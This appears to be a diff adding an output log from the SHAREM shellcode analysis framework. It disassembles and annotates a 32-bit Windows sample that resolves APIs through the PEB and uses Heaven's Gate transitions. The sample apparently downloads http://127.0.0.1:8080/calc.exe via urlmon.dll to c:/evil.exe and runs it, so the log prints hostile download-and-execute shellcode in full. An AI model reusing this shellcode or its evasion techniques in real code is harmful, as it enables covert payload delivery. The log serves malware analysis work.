@@ -1,0 +1,1052 @@
+
+
+new module heavenbin.bin - shellcode -  len rawdata2: 1897
+# mods 1
+
+
+Config file Error: stub.txt doesn't exist!
+
+
+  ____  _   _    _    ____  _____ __  __       ("`-''-/").___..--''"`-._          
+ / ___|| | | |  / \  |  _ \| ____|  \/  |       `6_ 6  )   `-.  (     ).`-.__.`)  
+ \___ \| |_| | / _ \ | |_) |  _| | |\/| |       (_Y_.)'  ._   )  `._ `. ``-..-'   
+  ___) |  _  |/ ___ \|  _ <| |___| |  | |     _..`--'_..-_/  /--'_.' ,'           
+ |____/|_| |_/_/   \_\_| \_\_____|_|  |_|    (il),-''  (li),'  ((!.-'             
+ 
+
+
+  Shellcode Analysis & Emulation Framework, v. 1.0
+
+	Shellcode: heavenbin.bin	Md5: 315315214385965290c39ec95c24eeb1
+
+  .............
+     Options
+  .............
+ 
+   h		Display options.
+   s		Find Assembly instructions associated with shellcode.
+   d		Disassembly of shellcode submenu
+   D		Disassemble shellcode
+   ?		Shellcode Emulator
+   p		Print menu.
+   b		Brute-force deobfuscation of shellcode.
+   U		Toggle between actions on obfuscated/deobfuscated shellcode.
+   q		Quick find all.
+   k		Find strings.
+   m		Find modules in the IAT and beyond.
+   e		Find imports.
+   o		Output bins and ASCII text.
+   i		Show basic shellcode info.
+   a		Change architecture, 32-bit or 64-bit. [ 32-bit ]
+   c		Save current configuration.
+   z		Do everything with current selections.
+   x		Exit.
+	
+ Sharem> 
+shellDisassemblyInit 
+
+[*] Find strings 0.019999980926513672 
+
+[*] anaFindFF 0.0 
+------------dAnalysis 1897 0x0 0x768 
+[*] disHereAnalysis 0.0 
+[*] analysisConvertBytes 0.0 
+
+	[*] analysisFindHiddenCalls 0.0 
+
+	[*] anaFindStrings 0.009999752044677734 
+------------dshell 1897 0x0 0x255 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x255 0x25f 
+------------dshell 1897 0x25f 0x260 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x260 0x26b 
+------------dshell 1897 0x26b 0x26c caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x26c 0x28a 
+------------dshell 1897 0x28a 0x394 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x394 0x39c 
+------------dshell 1897 0x39c 0x3cb caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x3cb 0x3d2 
+------------dshell 1897 0x3d2 0x3ee caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x3ee 0x3f4 
+------------dshell 1897 0x3f4 0x4d8 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x4d8 0x4de 
+------------dshell 1897 0x4de 0x5c3 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x5c3 0x5ca 
+------------dshell 1897 0x5ca 0x5d8 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x5d8 0x5e6 
+------------dshell 1897 0x5e6 0x5e7 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x5e7 0x5f9 
+------------dshell 1897 0x5f9 0x5fa caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x5fa 0x60a 
+------------dshell 1897 0x60a 0x60b caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x60b 0x61b 
+------------dshell 1897 0x61b 0x61c caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x61c 0x62a 
+------------dshell 1897 0x62a 0x62b caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x62b 0x63f 
+------------dshell 1897 0x63f 0x640 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x640 0x64f 
+------------dshell 1897 0x64f 0x650 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x650 0x65d 
+------------dshell 1897 0x65d 0x65e caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x65e 0x66b 
+------------dshell 1897 0x66b 0x66c caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x66c 0x67c 
+------------dshell 1897 0x67c 0x67d caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x67d 0x686 
+------------dshell 1897 0x686 0x687 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x687 0x694 
+------------dshell 1897 0x694 0x695 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x695 0x69e 
+------------dshell 1897 0x69e 0x69f caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x69f 0x6a8 
+------------dshell 1897 0x6a8 0x6a9 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x6a9 0x6ba 
+------------dshell 1897 0x6ba 0x6bb caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x6bb 0x6d1 
+------------dshell 1897 0x6d1 0x6d2 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x6d2 0x6e9 
+------------dshell 1897 0x6e9 0x6ea caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x6ea 0x6fe 
+------------dshell 1897 0x6fe 0x6ff caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x6ff 0x70e 
+------------dshell 1897 0x70e 0x70f caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x70f 0x723 
+------------dshell 1897 0x723 0x724 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x724 0x73c 
+------------dshell 1897 0x73c 0x73d caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x73d 0x750 
+------------dshell 1897 0x750 0x751 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x751 0x75c 
+------------dshell 1897 0x75c 0x75d caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x75d 0x769 
+[*] inside dshell 0.009999990463256836 takeBytes 
+[*] inside makeDB 0.0 takeBytes 
+[*] big loop 0.03000020980834961 
+
+[*] findrange #1 0.039999961853027344 
+------------dAnalysis 1897 0x0 0x768 
+[*] disHereAnalysis 0.009999752044677734 
+[*] analysisConvertBytes 0.010000228881835938 
+
+	[*] analysisFindHiddenCalls 0.009999752044677734 
+
+	[*] anaFindStrings 0.0 
+------------dshell 1897 0x0 0x11 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x11 0x24 
+------------dshell 1897 0x24 0x32 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x32 0x34 
+------------dshell 1897 0x34 0x255 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x255 0x28a 
+------------dshell 1897 0x28a 0x2ac caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x2ac 0x2fc 
+------------dshell 1897 0x2fc 0x38b caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x38b 0x38e 
+------------dshell 1897 0x38e 0x394 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x394 0x3b2 
+------------dshell 1897 0x3b2 0x3c1 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x3c1 0x3d2 
+------------dshell 1897 0x3d2 0x3df caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x3df 0x4e8 
+------------dshell 1897 0x4e8 0x4f2 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x4f2 0x548 
+------------dshell 1897 0x548 0x54e caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x54e 0x55a 
+------------dshell 1897 0x55a 0x560 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x560 0x56c 
+------------dshell 1897 0x56c 0x572 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x572 0x57e 
+------------dshell 1897 0x57e 0x584 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x584 0x590 
+------------dshell 1897 0x590 0x596 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x596 0x5b4 
+------------dshell 1897 0x5b4 0x5ba caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x5ba 0x5ca 
+------------dshell 1897 0x5ca 0x5d8 caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x5d8 0x75c 
+------------dshell 1897 0x75c 0x75d caller:  takeBytes 
+dis: disHereMakeDB2 - range 0x75d 0x769 
+[*] inside dshell 0.010000228881835938 takeBytes 
+[*] inside makeDB 0.0 takeBytes 
+[*] big loop 0.010000228881835938 
+
+	[*] findrange 2 0.039999961853027344 
+
+	[*] TakeBytes: 0.1400003433227539 
+
+[*] Find strings 0.0 
+
+[*] anaFindFF 0.0 
+
+	[*] TakeBytes: 0.009999752044677734 
+
+[*] Find strings 0.0 
+
+[*] anaFindFF 0.0 
+
+	[*] TakeBytes: 0.0 
+
+[*] Find strings 0.0 
+
+[*] anaFindFF 0.0 
+
+	[*] TakeBytes: 0.0 
+
+[*] Find strings 0.0 
+
+[*] anaFindFF 0.0 
+
+	[*] TakeBytes: 0.0 
+0x155 0x250d
+0x162 0x250d
+0x183 0x250d
+0x21d 0x250d
+
+0x0 dec esp                                  4c                     L
+     ; ***Shellcode Entry Point, offset 0x0***                                            
+0x1 add dword ptr [ecx], eax                 01 01                  ..
+0x3 add byte ptr [eax - 0x7d9fb826], bh      00 b8 da 47 60 82      ...G`.
+0x9 add eax, dword ptr [eax]                 03 00                  ..
+0xb add byte ptr [ecx], ah                   00 21                  .!
+0xd add byte ptr [eax], al                   00 00                  ..
+0xf add byte ptr [eax], al                   00 00                  ..
+0x11 align 0x3                                00 00 00 2e ...        .......
+0x14 db 0x2e                                  2e                     .
+0x15 db 0x74                                  74                     t
+0x16 db 0x65                                  65                     e
+0x17 db 0x78                                  78                     x
+0x18 db 0x74                                  74                     t
+0x19 db 0x00                                  00                     .
+0x1a db 0x00                                  00                     .
+0x1b db 0x00                                  00                     .
+0x1c db 0x00                                  00                     .
+0x1d db 0x00                                                         
+0x1d align 0x7                                00 00 00 00 ...        .......
+0x24 les eax, ptr [edx]                       c4 02                  ..
+0x26 add byte ptr [eax], al                   00 00                  ..
+0x28 cmp al, 0                                3c 00                  <.
+0x2a add byte ptr [eax], al                   00 00                  ..
+0x2c add byte ptr [ebx], al                   00 03                  ..
+0x2e add byte ptr [eax], al                   00 00                  ..
+0x30 add byte ptr [eax], al                   00 00                  ..
+0x32 align 0x2                                00 00 0d 00 ...        .......
+0x34 or eax, 0x20000000                       0d 00 00 00 20         .... 
+0x39 add byte ptr [eax + 0x60], dl            00 50 60               .P`
+0x3c call 0x41                                e8 00 00 00 00         .....
+	 label_0x41:
+0x41 pop edx                                  5a                     Z
+     ; GetPC                                                                      
+0x42 lea edx, [edx - 5]                       8d 52 fb               .R.
+0x45 mov ebp, esp                             89 e5                  ..
+0x47 sub esp, 0x1000                          81 ec 00 10 00 00      ......
+0x4d push edx                                 52                     R
+0x4e mov ebx, 0x4b1ffe8e                      bb 8e fe 1f 4b         ....K
+0x53 call 0x116                               e8 be 00 00 00         .....
+0x58 pop edx                                  5a                     Z
+0x59 push ebp                                 55                     U
+0x5a push edx                                 52                     R
+0x5b mov ebp, eax                             89 c5                  ..
+0x5d lea esi, [edx + 0x24f]                   8d b2 4f 02 00 00      ..O...
+0x63 lea edi, [edx + 0x25b]                   8d ba 5b 02 00 00      ..[...
+0x69 call 0x16c                               e8 fe 00 00 00         .....
+0x6e pop edx                                  5a                     Z
+0x6f pop ebp                                  5d                     ]
+0x70 push ebp                                 55                     U
+0x71 push edx                                 52                     R
+0x72 lea esi, [edx + 0x219]                   8d b2 19 02 00 00      ......
+0x78 push esi                                 56                     V
+0x79 push dword ptr [edx + 0x25f]             ff b2 5f 02 00 00      .._...
+0x7f pop eax                                  58                     X
+0x80 call eax                                 ff d0                  ..
+0x82 pop edx                                  5a                     Z
+0x83 pop ebp                                  5d                     ]
+0x84 nop                                      90                     .
+0x85 nop                                      90                     .
+0x86 fsqrt                                    d9 fa                  ..
+     ; floating point to set up GetPC                                             
+0x88 nop                                      90                     .
+0x89 nop                                      90                     .
+0x8a fnstenv [esp + 4]                        d9 74 24 04            .t$.
+     ; GetPC                                                                      
+0x8e push ebp                                 55                     U
+0x8f push edx                                 52                     R
+0x90 mov ebp, eax                             89 c5                  ..
+0x92 lea esi, [edx + 0x263]                   8d b2 63 02 00 00      ..c...
+0x98 lea edi, [edx + 0x26b]                   8d ba 6b 02 00 00      ..k...
+0x9e call 0x16c                               e8 c9 00 00 00         .....
+0xa3 pop edx                                  5a                     Z
+0xa4 pop ebp                                  5d                     ]
+0xa5 wait                                     9b                     .
+0xa6 fnstenv [ecx + 0xc]                      d9 71 0c               .q.
+0xa9 fnstenv [ebp + 7]                        d9 75 07               .u.
+0xac push ebp                                 55                     U
+0xad push edx                                 52                     R
+0xae push 0                                   6a 00                  j.
+0xb0 push 0                                   6a 00                  j.
+0xb2 lea esi, [edx + 0x224]                   8d b2 24 02 00 00      ..$...
+0xb8 push esi                                 56                     V
+0xb9 lea esi, [edx + 0x230]                   8d b2 30 02 00 00      ..0...
+0xbf push esi                                 56                     V
+0xc0 push 0                                   6a 00                  j.
+0xc2 push dword ptr [edx + 0x26b]             ff b2 6b 02 00 00      ..k...
+0xc8 pop eax                                  58                     X
+0xc9 call eax                                 ff d0                  ..
+0xcb pop edx                                  5a                     Z
+0xcc pop ebp                                  5d                     ]
+0xcd fsqrt                                    d9 fa                  ..
+     ; floating point to set up GetPC                                             
+0xcf nop                                      90                     .
+0xd0 nop                                      90                     .
+0xd1 nop                                      90                     .
+0xd2 nop                                      90                     .
+0xd3 wait                                     9b                     .
+0xd4 fnstenv [esp + 4]                        d9 74 24 04            .t$.
+     ; GetPC                                                                      
+0xd8 push ebp                                 55                     U
+0xd9 push edx                                 52                     R
+0xda lea esi, [edx + 0x26f]                   8d b2 6f 02 00 00      ..o...
+0xe0 push esi                                 56                     V
+0xe1 lea esi, [edx + 0x27f]                   8d b2 7f 02 00 00      ......
+0xe7 push esi                                 56                     V
+0xe8 push 0                                   6a 00                  j.
+0xea push 0                                   6a 00                  j.
+0xec push 0                                   6a 00                  j.
+0xee push 0                                   6a 00                  j.
+0xf0 push 0                                   6a 00                  j.
+0xf2 push 0                                   6a 00                  j.
+0xf4 lea esi, [edx + 0x224]                   8d b2 24 02 00 00      ..$...
+0xfa push esi                                 56                     V
+0xfb push 0                                   6a 00                  j.
+0xfd push dword ptr [edx + 0x25b]             ff b2 5b 02 00 00      ..[...
+0x103 pop eax                                  58                     X
+0x104 call eax                                 ff d0                  ..
+0x106 pop edx                                  5a                     Z
+0x107 pop ebp                                  5d                     ]
+0x108 ret                                      c3                     .
+
+0x109 fldpi                                    d9 eb                  ..
+     ; floating point to set up GetPC                                             
+0x10b mov eax, 0x42                            b8 42 00 00 00         .B...
+0x110 add eax, 0x20                            83 c0 20               .. 
+0x113 wait                                     9b                     .
+0x114 fnstenv [eax]                            d9 30                  .0
+     ; GetPC                                                                      
+	 label_0x116:
+0x116 cld                                      fc                     .
+0x117 xor edi, edi                             31 ff                  1.
+0x119 mov edi, dword ptr fs:[0x30]             64 8b 3d 30 00 00 00   d.=0...
+    ; load TIB                                                                    
+0x120 mov edi, dword ptr [edi + 0xc]           8b 7f 0c               ...
+    ; load PEB_LDR_DATA LoaderData                                                
+0x123 jmp 0x12d                                eb 08                  ..
+
+0x125 mov edi, dword ptr [edi + 0x14]          8b 7f 14               ...
+    ; LIST_ENTRY InMemoryOrderModuleList                                            
+	 label_0x128:
+0x128 mov esi, dword ptr [edi + 0x28]          8b 77 28               .w(
+0x12b xor edx, edx                             31 d2                  1.
+	 label_0x12d:
+0x12d lodsw ax, word ptr [esi]                 66 ad                  f.
+0x12f test al, al                              84 c0                  ..
+0x131 je 0x144                                 74 11                  t.
+
+0x133 cmp al, 0x41                             3c 41                  <A
+0x135 jb 0x13d                                 72 06                  r.
+
+0x137 cmp al, 0x5a                             3c 5a                  <Z
+0x139 ja 0x13d                                 77 02                  w.
+
+0x13b or al, 0x20                              0c 20                  . 
+	 label_0x13d:
+0x13d rol edx, 7                               c1 c2 07               ...
+0x140 xor dl, al                               30 c2                  0.
+0x142 jmp 0x12d                                eb e9                  ..
+
+	 label_0x144:
+0x144 cmp edx, ebx                             39 da                  9.
+0x146 mov eax, dword ptr [edi + 0x10]          8b 47 10               .G.
+0x149 mov edi, dword ptr [edi]                 8b 3f                  .?
+0x14b xor ebx, ebx                             31 db                  1.
+0x14d xor ebx, eax                             31 c3                  1.
+0x14f push 0x26                                6a 26                  j&
+0x151 pop eax                                  58                     X
+0x152 xor ecx, ecx                             31 c9                  1.
+0x154 push ebx                                 53                     S
+0x155 call dword ptr fs:[0xc0]                 64 ff 15 c0 00 00 00   d......
+     ; Calling Windows syscall - value: 0x26                                            
+0x15c mov ecx, eax                             89 c1                  ..
+0x15e sub ecx, 0xb                             83 e9 0b               ...
+0x161 push ecx                                 51                     Q
+0x162 call dword ptr fs:[0xc0]                 64 ff 15 c0 00 00 00   d......
+     ; Calling Windows syscall - value: 0x26                                            
+0x169 jne 0x128                                75 bd                  u.
+
+0x16b ret                                      c3                     .
+
+	 label_0x16c:
+0x16c mov edx, ebp                             89 ea                  ..
+0x16e add edx, dword ptr [edx + 0x3c]          03 52 3c               .R<
+0x171 mov edx, dword ptr [edx + 0x78]          8b 52 78               .Rx
+0x174 add edx, ebp                             01 ea                  ..
+0x176 mov ebx, dword ptr [edx + 0x20]          8b 5a 20               .Z 
+0x179 push 0x13                                6a 13                  j.
+0x17b pop ecx                                  59                     Y
+0x17c mov eax, 0x13                            b8 13 00 00 00         .....
+0x181 add eax, ecx                             01 c8                  ..
+0x183 call dword ptr fs:[0xc0]                 64 ff 15 c0 00 00 00   d......
+     ; Calling Windows syscall - value: 0x26                                            
+0x18a add ebx, ebp                             01 eb                  ..
+0x18c xor ecx, ecx                             31 c9                  1.
+	 label_0x18e:
+0x18e push edi                                 57                     W
+0x18f push esi                                 56                     V
+0x190 mov esi, dword ptr [esi]                 8b 36                  .6
+	 label_0x192:
+0x192 mov edi, dword ptr [ebx]                 8b 3b                  .;
+0x194 add edi, ebp                             01 ef                  ..
+0x196 push edx                                 52                     R
+0x197 xor edx, edx                             31 d2                  1.
+	 label_0x199:
+0x199 rol edx, 7                               c1 c2 07               ...
+0x19c xor dl, byte ptr [edi]                   32 17                  2.
+0x19e inc edi                                  47                     G
+0x19f cmp byte ptr [edi], 0                    80 3f 00               .?.
+0x1a2 jne 0x199                                75 f5                  u.
+
+0x1a4 push edx                                 52                     R
+    ; pushing return address                                                      
+0x1a5 ret                                      c3                     .
+    ; returning to edx                                                            
+
+0x1a6 push 0x33                                6a 33                  j3
+     ; Heaven's gate destination address: 0x33                                            
+0x1a8 push 0xdeafbeef                          68 ef be af de         h....
+0x1ad retf                                     cb                     .
+     ; invoking Heaven's Gate technique                                            
+0x1ae push edx                                 52                     R
+    ; pushing return address                                                      
+0x1af ret                                      c3                     .
+    ; returning to edx                                                            
+
+0x1b0 push ebx                                 53                     S
+    ; pushing return address                                                      
+0x1b1 ret                                      c3                     .
+    ; returning to ebx                                                            
+
+0x1b2 ljmp 0x33:0x12345678                     ea 78 56 34 12 33 00   .xV4.3.
+     ; invoking Heaven's Gate technique                                            
+0x1b9 xchg eax, edx                            92                     .
+0x1ba pop edx                                  5a                     Z
+0x1bb cmp eax, esi                             39 f0                  9.
+0x1bd je 0x1d8                                 74 19                  t.
+
+0x1bf add ebx, 4                               83 c3 04               ...
+0x1c2 inc ecx                                  41                     A
+0x1c3 cmp dword ptr [edx + 0x18], ecx          39 4a 18               9J.
+0x1c6 jne 0x192                                75 ca                  u.
+
+0x1c8 pop esi                                  5e                     ^
+0x1c9 pop edi                                  5f                     _
+0x1ca call 0x1cf                               e8 00 00 00 00         .....
+	 label_0x1cf:
+0x1cf pop eax                                  58                     X
+     ; GetPC                                                                      
+0x1d0 lcall 0x33:0x12310000                    9a 00 00 31 12 33 00   ...1.3.
+     ; invoking Heaven's Gate technique                                            
+0x1d7 ret                                      c3                     .
+
+	 label_0x1d8:
+0x1d8 pop esi                                  5e                     ^
+0x1d9 pop edi                                  5f                     _
+0x1da lodsd eax, dword ptr [esi]               ad                     .
+0x1db push esi                                 56                     V
+0x1dc mov ebp, dword ptr fs:[eax + 0x30]       64 8b 68 30            d.h0
+    ; load TIB                                                                    
+0x1e0 mov edi, dword ptr [edi + 0xc]           8b 7f 0c               ...
+    ; load PEB_LDR_DATA LoaderData                                                
+0x1e3 mov edi, dword ptr [edi + 0x14]          8b 7f 14               ...
+    ; LIST_ENTRY InMemoryOrderModuleList                                            
+0x1e6 lodsd eax, dword ptr [esi]               ad                     .
+    ; advancing DLL flink                                                         
+0x1e7 push ebx                                 53                     S
+    ; pushing return address                                                      
+0x1e8 ret                                      c3                     .
+    ; returning to ebx                                                            
+
+0x1e9 push 0x33                                6a 33                  j3
+     ; Heaven's gate destination address: 0x33                                            
+0x1eb push 0x11111111                          68 11 11 11 11         h....
+0x1f0 retf                                     cb                     .
+     ; invoking Heaven's Gate technique                                            
+0x1f1 push edx                                 52                     R
+    ; pushing return address                                                      
+0x1f2 ret                                      c3                     .
+    ; returning to edx                                                            
+
+0x1f3 ljmp 0x33:0xdeadbeef                     ea ef be ad de 33 00   .....3.
+     ; invoking Heaven's Gate technique                                            
+0x1fa mov ebx, ebp                             89 eb                  ..
+0x1fc mov esi, ebx                             89 de                  ..
+0x1fe add ebx, dword ptr [edx + 0x24]          03 5a 24               .Z$
+0x201 lea eax, [ebx + ecx*2]                   8d 04 4b               ..K
+0x204 movzx eax, word ptr [eax]                0f b7 00               ...
+0x207 push 0x26                                6a 26                  j&
+0x209 pop eax                                  58                     X
+0x20a add eax, 0x14                            83 c0 14               ...
+0x20d xor ebx, ebx                             31 db                  1.
+0x20f add ebx, eax                             01 c3                  ..
+0x211 mov edx, ebx                             89 da                  ..
+0x213 sub edx, eax                             29 c2                  ).
+0x215 push edx                                 52                     R
+0x216 lcall 0x33:0x1337c0de                    9a de c0 37 13 33 00   ...7.3.
+     ; invoking Heaven's Gate technique                                            
+0x21d call dword ptr fs:[0xc0]                 64 ff 15 c0 00 00 00   d......
+     ; Calling Windows syscall - value: unknown                                            
+0x224 lea eax, [esi + eax*4]                   8d 04 86               ...
+0x227 add eax, dword ptr [edx + 0x1c]          03 42 1c               .B.
+0x22a mov eax, dword ptr [eax]                 8b 00                  ..
+0x22c add eax, esi                             01 f0                  ..
+0x22e stosd dword ptr es:[edi], eax            ab                     .
+0x22f call 0x23f                               e8 0b 00 00 00         .....
+0x234 add eax, 3                               83 c0 03               ...
+0x237 push 0x33                                6a 33                  j3
+     ; Heaven's gate destination address: 0x33                                            
+0x239 push 0x401000                            68 00 10 40 00         h..@.
+0x23e retf                                     cb                     .
+     ; invoking Heaven's Gate technique                                            
+	 label_0x23f:
+0x23f pop ebx                                  5b                     [
+     ; GetPC                                                                      
+0x240 pop ebx                                  5b                     [
+0x241 push ebx                                 53                     S
+    ; pushing return address                                                      
+0x242 ret                                      c3                     .
+    ; returning to ebx                                                            
+
+0x243 pop esi                                  5e                     ^
+0x244 add ebx, 4                               83 c3 04               ...
+0x247 inc ecx                                  41                     A
+0x248 cmp dword ptr [esi], 0xffff              81 3e ff ff 00 00      .>....
+0x24e jne 0x18e                                0f 85 3a ff ff ff      ..:...
+
+0x254 ret                                      c3                     .
+
+0x255 urlmon.dll ; string		         75 72 6c 6d 6f 6e 2e 64 ... urlmon.dll
+0x25f db 0x00                                  00                     .
+0x260 c:/evil.exe ; string		        63 3a 2f 65 76 69 6c 2e ... c:/evil.exe
+0x26b db 0x00                                  00                     .
+0x26c http://127.0.0.1:8080/calc.exe ; string		  68 74 74 70 3a 2f 2f 31 ... http://127.0.0.1:8080/calc.exe
+0x28a add bh, al                               00 c7                  ..
+0x28c mov dh, byte ptr [ecx]                   8a 31                  .1
+0x28e inc esi                                  46                     F
+0x28f sub byte ptr es:[eax + ecx*8 + 0xffff], 1 26 80 ac c8 ff ff 00 00 ... &........
+0x298 add byte ptr [eax], al                   00 00                  ..
+0x29a add byte ptr [edx], al                   00 02                  ..
+0x29c add byte ptr [eax], al                   00 00                  ..
+0x29e add byte ptr [ecx - 0x26a2dd], bl        00 99 23 5d d9 ff      ..#]..
+0x2a4 inc dword ptr [eax]                      ff 00                  ..
+0x2a6 add byte ptr [ebx], al                   00 03                  ..
+0x2a8 add byte ptr [eax], al                   00 00                  ..
+0x2aa add byte ptr [eax], al                   00 00                  ..
+0x2ac align 0x50                               00 00 00 00 ...        .......
+0x2fc add dword ptr [eax], eax                 01 00                  ..
+0x2fe add byte ptr [eax], al                   00 00                  ..
+0x300 and eax, dword ptr [eax]                 23 00                  #.
+0x302 add byte ptr [eax], al                   00 00                  ..
+0x304 add al, byte ptr [eax]                   02 00                  ..
+0x306 add byte ptr [eax], al                   00 00                  ..
+0x308 push es                                  06                     .
+0x309 add byte ptr [ecx], ch                   00 29                  .)
+0x30b add byte ptr [eax], al                   00 00                  ..
+0x30d add byte ptr [edx], al                   00 02                  ..
+0x30f add byte ptr [eax], al                   00 00                  ..
+0x311 add byte ptr [esi], al                   00 06                  ..
+0x313 add byte ptr [eax], bh                   00 38                  .8
+0x315 add byte ptr [eax], al                   00 00                  ..
+0x317 add byte ptr [edx], al                   00 02                  ..
+0x319 add byte ptr [eax], al                   00 00                  ..
+0x31b add byte ptr [esi], al                   00 06                  ..
+0x31d add byte ptr [edi], bh                   00 3f                  .?
+0x31f add byte ptr [eax], al                   00 00                  ..
+0x321 add byte ptr [edx], al                   00 02                  ..
+0x323 add byte ptr [eax], al                   00 00                  ..
+0x325 add byte ptr [esi], al                   00 06                  ..
+0x327 add byte ptr [eax], bl                   00 58 00               .X.
+0x32a add byte ptr [eax], al                   00 00                  ..
+0x32c add al, byte ptr [eax]                   02 00                  ..
+0x32e add byte ptr [eax], al                   00 00                  ..
+0x330 push es                                  06                     .
+0x331 add byte ptr [esi], bl                   00 5e 00               .^.
+0x334 add byte ptr [eax], al                   00 00                  ..
+0x336 add al, byte ptr [eax]                   02 00                  ..
+0x338 add byte ptr [eax], al                   00 00                  ..
+0x33a push es                                  06                     .
+0x33b add byte ptr [eax], bh                   00 78 00               .x.
+0x33e add byte ptr [eax], al                   00 00                  ..
+0x340 add al, byte ptr [eax]                   02 00                  ..
+0x342 add byte ptr [eax], al                   00 00                  ..
+0x344 push es                                  06                     .
+0x345 add byte ptr [edi], bh                   00 7f 00               ...
+0x348 add byte ptr [eax], al                   00 00                  ..
+0x34a add al, byte ptr [eax]                   02 00                  ..
+0x34c add byte ptr [eax], al                   00 00                  ..
+0x34e push es                                  06                     .
+0x34f add byte ptr [eax + 0x2000000], cl       00 88 00 00 00 02      ......
+0x355 add byte ptr [eax], al                   00 00                  ..
+0x357 add byte ptr [esi], al                   00 06                  ..
+0x359 add byte ptr [eax + 0x2000000], ah       00 a0 00 00 00 02      ......
+0x35f add byte ptr [eax], al                   00 00                  ..
+0x361 add byte ptr [esi], al                   00 06                  ..
+0x363 add byte ptr [edi + 0x2000000], ah       00 a7 00 00 00 02      ......
+0x369 add byte ptr [eax], al                   00 00                  ..
+0x36b add byte ptr [esi], al                   00 06                  ..
+0x36d add byte ptr [edx + 0x2000000], bh       00 ba 00 00 00 02      ......
+0x373 add byte ptr [eax], al                   00 00                  ..
+0x375 add byte ptr [esi], al                   00 06                  ..
+0x377 add bl, al                               00 c3                  ..
+0x379 add byte ptr [eax], al                   00 00                  ..
+0x37b add byte ptr [edx], al                   00 02                  ..
+0x37d add byte ptr [eax], al                   00 00                  ..
+0x37f add byte ptr [esi], al                   00 06                  ..
+0x381 add byte ptr [esi], ch                   00 2e                  ..
+0x383 imul bp, word ptr [ebp], 0               66 69 6c 65 00 00 00   file...
+0x38a db 0x00                                  00                     .
+0x38b align 0x3                                00 00 00 fe ...        .......
+0x38e db 0xfe                                  fe                     .
+0x38f inc dword ptr [eax]                      ff 00                  ..
+0x391 add byte ptr [edi + 1], ah               00 67 01               .g.
+0x394 work.asm ; string		           77 6f 72 6b 2e 61 73 6d  work.asm
+0x39c db 0x00                                  00                     .
+0x39d db 0x00                                  00                     .
+0x39e db 0x00                                  00                     .
+0x39f db 0x00                                  00                     .
+0x3a0 db 0x00                                                         
+0x3a0 align 0x6                                00 00 00 00 ...        .......
+0x3a6 db 0x2e                                  2e                     .
+0x3a7 db 0x74                                  74                     t
+0x3a8 db 0x65                                  65                     e
+0x3a9 db 0x78                                  78                     x
+0x3aa db 0x74                                  74                     t
+0x3ab db 0x00                                  00                     .
+0x3ac db 0x00                                  00                     .
+0x3ad db 0x00                                  00                     .
+0x3ae db 0x00                                  00                     .
+0x3af db 0x00                                                         
+0x3af align 0x3                                00 00 00 01 ...        .......
+0x3b2 add dword ptr [eax], eax                 01 00                  ..
+0x3b4 add byte ptr [eax], al                   00 00                  ..
+0x3b6 add eax, dword ptr [ecx]                 03 01                  ..
+0x3b8 les eax, ptr [edx]                       c4 02                  ..
+0x3ba add byte ptr [eax], al                   00 00                  ..
+0x3bc or eax, 0                                0d 00 00 00 00         .....
+0x3c1 align 0x9                                00 00 00 00 ...        .......
+0x3ca db 0x2e                                  2e 61 62 73 6f 6c 75 74  .absolut
+0x3d2 add byte ptr [eax], al                   00 00                  ..
+0x3d4 add byte ptr [eax], al                   00 00                  ..
+0x3d6 db 0xff                                  ff                     .
+0x3d7 inc dword ptr [eax]                      ff 00                  ..
+0x3d9 add byte ptr [ebx], al                   00 03                  ..
+0x3db add byte ptr [eax], al                   00 00                  ..
+0x3dd add byte ptr [eax], al                   00 00                  ..
+0x3df align 0x1                                00 04 00 00 ...        .......
+0x3e0 db 0x04                                  04                     .
+0x3e1 db 0x00                                  00                     .
+0x3e2 db 0x00                                  00                     .
+0x3e3 db 0x00                                  00                     .
+0x3e4 db 0x00                                  00                     .
+0x3e5 db 0x00                                                         
+0x3e5 align 0x7                                00 00 00 00 ...        .......
+0x3ec db 0x02                                  02                     .
+0x3ed db 0x00                                  00                     .
+0x3ee geteip ; string		             67 65 74 65 69 70      geteip
+0x3f4 db 0x00                                  00                     .
